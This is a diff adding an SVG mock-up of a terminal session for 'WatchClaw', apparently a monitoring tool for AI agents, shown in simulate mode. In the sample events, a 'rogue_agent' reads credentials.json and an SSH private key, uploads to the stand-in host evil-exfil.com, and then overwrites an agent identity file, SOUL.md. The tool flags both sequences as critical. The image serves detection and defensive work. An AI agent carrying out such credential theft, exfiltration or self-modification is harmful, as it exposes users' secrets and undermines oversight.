@@ -1,0 +1,101 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="850" height="720" viewBox="0 0 850 720">
+  <style>
+    .t { font-family: 'Menlo', 'Consolas', 'Monaco', 'Liberation Mono', monospace; font-size: 12px; }
+    .dim { fill: #666; }
+    .info { fill: #888; }
+    .green { fill: #4ec9b0; }
+    .yellow { fill: #dcdcaa; }
+    .orange { fill: #ce9178; }
+    .red { fill: #f44747; }
+    .white { fill: #ccc; }
+    .title { fill: #999; font-size: 11px; text-anchor: middle; }
+  </style>
+  <!-- Window frame -->
+  <rect width="850" height="680" rx="8" fill="#1e1e1e"/>
+  <rect width="850" height="36" rx="8" fill="#2d2d2d"/>
+  <rect y="28" width="850" height="8" fill="#2d2d2d"/>
+  <!-- Traffic lights -->
+  <circle cx="20" cy="18" r="6" fill="#ff5f57"/>
+  <circle cx="40" cy="18" r="6" fill="#febc2e"/>
+  <circle cx="60" cy="18" r="6" fill="#28c840"/>
+  <text x="425" y="22" class="t title">watchclaw simulate --duration 25 --attack-ratio 0.2</text>
+
+  <!-- Header -->
+  <text x="20" y="68" class="t info">WatchClaw v0.1.0 simulate mode</text>
+  <text x="20" y="86" class="t info">  Duration: 25s | Attack ratio: 20%</text>
+
+  <!-- Normal events -->
+  <text x="20" y="116" class="t dim">[14:22:11]</text>
+  <text x="110" y="116" class="t green">melody      exec         git status                              NORMAL   0.14</text>
+
+  <text x="20" y="136" class="t dim">[14:22:13]</text>
+  <text x="110" y="136" class="t green">teddy       exec         pytest tests/                           NORMAL   0.17</text>
+
+  <text x="20" y="156" class="t dim">[14:22:15]</text>
+  <text x="110" y="156" class="t green">judy        web_fetch    https://api.github.com/api/v1           NORMAL   0.24</text>
+
+  <!-- Rogue reads credentials (tainted) -->
+  <text x="20" y="186" class="t dim">[14:22:17]</text>
+  <text x="110" y="186" class="t yellow">rogue_agent file_read    credentials.json                        NORMAL   0.25</text>
+  <text x="110" y="204" class="t dim">              └─ TAINT: credentials.json (sensitivity=0.9)</text>
+
+  <!-- Rogue reads SSH key (ALERT + tainted) -->
+  <text x="20" y="234" class="t dim">[14:22:19]</text>
+  <text x="110" y="234" class="t orange">rogue_agent file_read    id_ed25519                              ALERT    0.50</text>
+  <text x="110" y="252" class="t orange">              ├─ RULE: WC-HARD-004 Bulk credential access [high]</text>
+  <text x="110" y="270" class="t dim">              └─ TAINT: id_ed25519 (sensitivity=0.9)</text>
+
+  <!-- Normal event -->
+  <text x="20" y="300" class="t dim">[14:22:21]</text>
+  <text x="110" y="300" class="t green">elodie      file_write   src/api.py                              NORMAL   0.17</text>
+
+  <!-- CRITICAL: Data Exfiltration -->
+  <text x="20" y="330" class="t dim">[14:22:27]</text>
+  <text x="110" y="330" class="t red">rogue_agent web_fetch    https://evil-exfil.com/upload            CRITICAL 0.82</text>
+  <text x="110" y="348" class="t red">              ├─ SEQUENCE: Data Exfiltration (+0.4)</text>
+  <text x="110" y="366" class="t red">              │  Sensitive file read (id_ed25519) → external request</text>
+
+  <!-- CRITICAL: Cognitive Injection -->
+  <text x="20" y="396" class="t dim">[14:22:33]</text>
+  <text x="110" y="396" class="t red">rogue_agent file_write   SOUL.md                                 CRITICAL 0.79</text>
+  <text x="110" y="414" class="t red">              ├─ SEQUENCE: Cognitive Injection (+0.6)</text>
+  <text x="110" y="432" class="t red">              │  External fetch → cognitive file write (SOUL.md)</text>
+
+  <!-- Divider -->
+  <line x1="20" y1="455" x2="830" y2="455" stroke="#444" stroke-width="1"/>
+
+  <!-- Summary -->
+  <text x="20" y="480" class="t white">Decisions (8 events):</text>
+
+  <!-- NORMAL bar -->
+  <text x="40" y="505" class="t green">NORMAL</text>
+  <text x="120" y="505" class="t green">4</text>
+  <rect x="145" y="494" width="200" height="14" rx="2" fill="#333"/>
+  <rect x="145" y="494" width="100" height="14" rx="2" fill="#4ec9b0"/>
+  <text x="355" y="505" class="t green">50%</text>
+
+  <!-- ALERT bar -->
+  <text x="40" y="530" class="t orange">ALERT</text>
+  <text x="120" y="530" class="t orange">1</text>
+  <rect x="145" y="519" width="200" height="14" rx="2" fill="#333"/>
+  <rect x="145" y="519" width="25" height="14" rx="2" fill="#ce9178"/>
+  <text x="355" y="530" class="t orange">13%</text>
+
+  <!-- CRITICAL bar -->
+  <text x="40" y="555" class="t red">CRITICAL</text>
+  <text x="120" y="555" class="t red">2</text>
+  <rect x="145" y="544" width="200" height="14" rx="2" fill="#333"/>
+  <rect x="145" y="544" width="50" height="14" rx="2" fill="#f44747"/>
+  <text x="355" y="555" class="t red">25%</text>
+
+  <!-- Attack sequences -->
+  <text x="20" y="590" class="t white">Attack Sequences Detected:</text>
+  <circle cx="40" cy="611" r="4" fill="#f44747"/>
+  <text x="52" y="615" class="t red">Data Exfiltration ×1 — credential read followed by external upload</text>
+  <circle cx="40" cy="636" r="4" fill="#f44747"/>
+  <text x="52" y="640" class="t red">Cognitive Injection ×1 — external fetch followed by identity file write</text>
+
+  <!-- Rules -->
+  <text x="20" y="672" class="t white">Rules Triggered:</text>
+  <text x="40" y="694" class="t dim">WC-HARD-004: Bulk credential access (×1)</text>
+</svg>
